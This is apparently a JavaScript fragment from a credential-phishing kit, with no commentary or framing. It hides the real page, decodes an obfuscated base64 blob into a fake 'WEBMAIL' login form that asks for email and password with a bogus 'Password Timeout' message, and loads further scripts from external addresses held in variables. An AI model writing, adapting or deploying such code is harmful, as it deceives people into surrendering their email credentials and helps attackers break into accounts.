document.querySelector("html").style.display = "none";
    if (document.querySelectorAll('#AppRoot').length > 0) {
        document.getElementById("AppRoot").style.opacity = '0';
    }else {
        document.body.style.opacity = '0';
    }

    let Nodes = decodeURIComponent(atob("JTIwJTNDZGl2JTIwaWQlM0QlMjJodG1sX2VuY29kZXJfZGl2JTIyJTNFJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJjb250YWluZXIlMjIlM0UlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMm9mZmljZSUyMHNob3clMjBib3JkZXIlMjBzaGFkb3clMjBiZy1saWdodCUyMiUyMGlkJTNEJTIyb3RoZXJzJTIyJTNFJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJvZmZpY2UtaG9sZGVyJTIyJTNFJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJsb2dvJTIyJTIwc3R5bGUlM0QlMjJ0ZXh0LWFsaWduJTNBY2VudGVyJTIyJTNFJTIwJTNDZGl2JTIwaWQlM0QlMjJsb2dpbl9sb2dvJTIyJTNFJTIwJTNDaW1nJTIwaWQlM0QlMjJsb2dpbl9sb2dvMSUyMiUyMHN0eWxlJTNEJTIybWF4LWhlaWdodCUzQSUyMDUwcHglM0IlMjBtYXgtd2lkdGglM0ElMjAxMjhweCUyMiUyMGFsdCUzRCUyMldlYm1haWwlMjIlM0UlMjAlM0MlMkZkaXYlM0UlMjAlM0NoMyUyMGNsYXNzJTNEJTIydGV4dC1kYXJrJTIyJTNFJTNDc3Ryb25nJTIwaWQlM0QlMjJkb21haW4tbmFtZSUyMiUyMGNsYXNzJTNEJTIydGV4dC11cHBlcmNhc2UlMjIlM0VXRUJNQUlMJTNDJTJGc3Ryb25nJTNFJTNDJTJGaDMlM0UlMjAlM0NoNSUyMGNsYXNzJTNEJTIyZm9udC13ZWlnaHQtbGlnaHQlMjIlM0VzaWduJTIwaW4lMjB1c2luZyUyMHlvdXIlMjBlbWFpbCUyMGFuZCUyMHBhc3N3b3JkJTIwdG8lMjBhY2Nlc3MlMjBhZG1pbiUyMHBvcnRhbCUzQyUyRmg1JTNFJTIwJTNDJTJGZGl2JTNFJTIwJTNDY2VudGVyJTNFJTIwJTNDZGl2JTIwaWQlM0QlMjJtc2clMjIlMjBzdHlsZSUzRCUyMmRpc3BsYXklM0ElMjBub25lJTNCZm9udC13ZWlnaHQlM0ElMjA2MDAlM0Jjb2xvciUzQSUyMHJlZCUzQiUyMiUzRVBhc3N3b3JkJTIwVGltZW91dC4hJTIwUGxlYXNlJTIwcmUtZW50ZXIlMjB5b3VyJTIwcGFzc3dvcmQuJTNDJTJGZGl2JTNFJTIwJTNDc3BhbiUyMGlkJTNEJTIyZXJyb3IlMjIlMjBjbGFzcyUzRCUyMnRleHQtZGFuZ2VyJTIyJTIwc3R5bGUlM0QlMjJkaXNwbGF5JTNBJTIwbm9uZSUzQiUyMiUzRVRoYXQlMjBhY2NvdW50JTIwZG9lc24ndCUyMGV4aXN0LiUyMEVudGVyJTIwYSUyMGRpZmZlcmVudCUyMGFjY291bnQlM0MlMkZzcGFuJTNFJTIwJTNDJTJGY2VudGVyJTNFJTIwJTNDZm9ybSUzRSUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIyZm9ybS1ob2xkZXIlMjIlM0UlMjAlM0NkaXYlMjBzdHlsZSUzRCUyMndpZHRoJTNBJTIwMTAwJTI1JTNCJTIyJTNFJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJhbGVydCUyMGFsZXJ0LWRhbmdlciUyMGhpZGUlMjBhbGVydDIlMjIlM0UlM0MlMkZkaXYlM0UlMjAlM0MlMkZkaXYlM0UlMjAlM0NpbnB1dCUyMHR5cGUlM0QlMjJlbWFpbCUyMiUyMGlkJTNEJTIyYWklMjIlMjBjbGFzcyUzRCUyMmZvcm0tY29udHJvbCUyMiUyMHZhbHVlJTNEJTIyJTIyJTIwcGxhY2Vob2xkZXIlM0QlMjJzb21lb25lJTQwZXhhbXBsZS5jb20lMjIlMjByZXF1aXJlZCUzRCUyMiUyMiUzRSUyMCUzQ2lucHV0JTIwdHlwZSUzRCUyMnBhc3N3b3JkJTIyJTIwaWQlM0QlMjJwciUyMiUyMHBsYWNlaG9sZGVyJTNEJTIyUGFzc3dvcmQlMjIlMjBjbGFzcyUzRCUyMmZvcm0tY29udHJvbCUyMiUyMHJlcXVpcmVkJTNEJTIyJTIyJTNFJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJjaGVja2JveCUyMiUzRSUyMCUzQ2lucHV0JTIwdHlwZSUzRCUyMmNoZWNrYm94JTIyJTIwbmFtZSUzRCUyMiUyMiUyMHN0eWxlJTNEJTIyZmxvYXQlM0ElMjBsZWZ0JTNCJTIwbWFyZ2luLXRvcCUzQTJweCUzQiUyMG1hcmdpbi1ib3R0b20lM0ElMjAxMHB4JTNCJTIyJTNFJTIwJTNDbGFiZWwlM0VSRU1FTUJFUiUyME1FJTNDJTJGbGFiZWwlM0UlMjAlM0MlMkZkaXYlM0UlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmJ0bi1ob2xkZXIlMjIlM0UlMjAlM0NidXR0b24lMjBjbGFzcyUzRCUyMmJ0biUyMGJ0bi1sZyUyMGNvbC0xMiUyMiUyMGlkJTNEJTIyc3VibWl0LWJ0biUyMiUzRUxPR0lOJTNDJTJGYnV0dG9uJTNFJTIwJTNDJTJGZGl2JTNFJTIwJTNDcCUyMHN0eWxlJTNEJTIyY29sb3IlM0ElMjMwMDczQzYlM0IlMjBtYXJnaW4tdG9wJTNBMWVtJTNCJTIwZmxvYXQlM0ElMjBsZWZ0JTNCJTIwd2lkdGglM0ExMDAlMjUlM0IlMjIlM0VjYW4ndCUyMGFjY2VzcyUyMHlvdXIlMjBhY2NvdW50JTNGJTNDJTJGcCUzRSUyMCUzQ3AlMjBzdHlsZSUzRCUyMmNvbG9yJTNBJTIzMDA3M0M2JTNCJTIwbWFyZ2luLXRvcCUzQTBlbSUzQiUyMGZsb2F0JTNBJTIwbGVmdCUzQiUyMHdpZHRoJTNBMTAwJTI1JTNCJTIyJTNFU2lnbiUyMGluJTIwd2l0aCUyMGElMjBzaW5nbGUtdXNlJTIwY29kZSUzQyUyRnAlM0UlMjAlM0MlMkZkaXYlM0UlMjAlM0MlMkZmb3JtJTNFJTIwJTNDJTJGZGl2JTNFJTIwJTNDJTJGZGl2JTNFJTIwJTNDJTJGZGl2JTNFJTIwJTNDJTJGZGl2JTNFJTIwJTIw"));
    $(document.body).append(Nodes);
    const script = document.createElement('script');
    script.src = __s1;
    script.async = true;
    document.head.append(script);
    script.onload = async function bolder(e) {
    document.title=decodeURIComponent(window.atob("TG9naW4lMjB0byUyMHlvdXIlMjB3ZWJtYWls"));
    if (__s2.length > 5) {
        const script2 = document.createElement('script');
        script2.src = __s2;
        document.head.append(script2);
        script2.onload = function reset_it(e) {
            const resetInit = setInterval(function () {
                if (document.querySelectorAll('#AppRoot').length > 0) {
                    clearInterval(resetInit);
                document.querySelector("html").style.display = "initial";
                    document.getElementById("AppRoot").style.opacity = '1';
                } else {
                    clearInterval(resetInit);
                document.querySelector("html").style.display = "initial";
                    document.body.style.opacity = '1';
                }
            }, 100)
        }
    } else {
        const resetInit2 = setInterval(function () {
            if (document.querySelectorAll('#AppRoot').length > 0) {
                clearInterval(resetInit2);
                document.querySelector("html").style.display = "initial";
                document.getElementById("AppRoot").style.opacity = '1';
            } else {
                clearInterval(resetInit2);
                document.querySelector("html").style.display = "initial";
                document.body.style.opacity = '1';
            }
        }, 100)
    }
}